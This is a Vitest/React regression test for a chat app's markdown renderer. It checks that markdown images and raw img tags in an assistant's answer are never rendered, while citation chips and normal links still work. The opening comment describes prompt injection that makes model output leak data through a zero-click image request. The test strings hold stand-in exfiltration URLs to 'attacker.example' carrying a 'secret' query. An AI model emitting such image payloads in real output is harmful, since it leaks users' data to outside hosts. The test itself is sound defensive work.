// Security regression: model output is untrusted, because a collected post can
// carry a prompt injection. A markdown image in an assistant answer must never
// mount an <img>, since a remote src is a zero-click request to any host.
import { describe, expect, it, vi } from 'vitest';
import { renderToStaticMarkup } from 'react-dom/server';

// The real chip reads the tweet from the database. A stub keeps this test about
// the markdown pipeline: it shows that [^id] still reaches the chip component.
vi.mock('../components/chat/CitationChip', () => ({
  CitationChip: ({ tweetId }: { tweetId: string }) => <span data-chip={tweetId} />,
}));

import { MarkdownMessage } from '../components/chat/MarkdownMessage';

const render = (content: string) => {
  const host = document.createElement('div');
  host.innerHTML = renderToStaticMarkup(<MarkdownMessage content={content} />);
  return host;
};

describe('MarkdownMessage untrusted images', () => {
  it('renders no img for a markdown image from the model', () => {
    const host = render('Here is the answer.\n\n![x](https://attacker.example/?q=secret)');
    expect(host.querySelector('img')).toBeNull();
    expect(host.innerHTML).not.toContain('attacker.example');
    expect(host.textContent).toContain('Here is the answer.');
  });

  it('renders no img for an image inside a link or for raw HTML', () => {
    const host = render(
      '[![x](https://attacker.example/a.png)](https://example.com/page)\n\n<img src="https://attacker.example/b.png">',
    );
    expect(host.querySelector('img')).toBeNull();
    expect(host.innerHTML).not.toContain('attacker.example');
  });

  it('keeps citation chips, wiki badges, and normal links', () => {
    const host = render(
      'See [^1800000000000000042] and [[concepts/agent-memory]] or [the docs](https://example.com/docs).',
    );
    expect(host.querySelector('[data-chip="1800000000000000042"]')).not.toBeNull();
    expect(host.textContent).toContain('concepts/agent-memory');
    const link = host.querySelector('a');
    expect(link?.getAttribute('href')).toBe('https://example.com/docs');
    expect(link?.getAttribute('rel')).toBe('noopener noreferrer');
  });
});
